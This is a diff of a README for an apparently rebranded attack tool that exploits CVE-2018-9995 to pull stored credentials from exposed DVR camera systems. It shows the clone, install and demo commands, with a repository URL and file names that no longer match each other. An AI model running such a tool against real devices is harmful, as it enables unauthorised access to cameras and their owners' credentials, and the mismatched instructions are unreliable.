@@ -1,5 +1,5 @@
 [Tool] show DVR Credentiales
-[*] Exploit Title:       "Gets DVR Credentials" 
+[*] Exploit Title:       "CAm" 
 [*] CVE:                 CVE-2018-9995
 [*] CVSS Base Score v3:  7.3 / 10
 [*] CVSS Vector String:  CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
@@ -30,13 +30,13 @@ DVR_login_1 DVR_login_2 DVR_login_3 DVR_login_4 DVR_login_5 DVR_login_6 DVR_logi
 Indoor:
 DVR_indoor_1 DVR_indoor_2 DVR_indoor_3 DVR_indoor_4 DVR_indoor_5 DVR_indoor_6 DVR_indoor_7
 
-TOOL: "Show all DVR Credentials"
+TOOL: "Show all Cam"
 Quick start
-usr@pwn:~$ git clone https://github.com/ezelf/CVE-2018-9995_dvr_credentials.git
+usr@pwn:~$ git clone https://github.com/YoZSploit/MOrooc/
 usr@pwn:~$ cd CVE-2018-9995_dvr_credentials
 usr@pwn:~$ pip install -r requirements.txt
 help
-usage: getDVR_Credentials.py [-h] [-v] --host HOST [--port PORT]
+usage: Cam.py [-h] [-v] --host HOST [--port PORT]
 
 [+] Obtaining Exposed credentials
 
@@ -46,7 +46,7 @@ optional arguments:
   --host HOST    Host
   --port PORT    Port
 
-[+] Demo: python getDVR_Credentials.py --host 192.168.1.101 -p 81
+[+] Demo: python CAm.py --host 192.168.1.101 -p 81
 Pocs (Output) :
 DVR_poc_4 DVR_poc_3 DVR_poc_2 DVR_poc_1
 
